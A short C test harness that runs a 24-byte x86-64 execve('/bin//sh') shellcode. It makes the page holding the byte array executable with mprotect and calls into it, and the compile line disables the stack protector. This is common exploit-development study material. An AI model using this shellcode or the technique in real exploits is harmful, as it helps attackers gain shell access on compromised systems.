/*
 * test-sh.c
 * dan.dsod@gmail.com
 * tests the execve_sh.s shellcode
 * I'm a bit old school and use assert to make executable stack
 * compile: gcc test-sh.c -o test-sh -fno-stack-protector
*/


#include <stdio.h>
#include <string.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <assert.h>

#define PAGE_SIZE  0x1000


char code[]=	"\x6a\x3b\x58\x99\x52\x48\xbf\x2f\x2f\x62\x69\x6e"
		"\x2f\x73\x68\x57\x54\x5f\x48\x31\xf6\x56\x0f\x05";

int main(){
        printf("shellcode length: %zu\n",strlen(code));
        int (*func)();
        // we need to make some memory executable to test the shellcode..
        assert(mprotect((void *)((size_t)code & (~(PAGE_SIZE -1 ))), PAGE_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE) == 0);
        func = (int (*)())code;
        (int)(*func)();
        return 0;
}


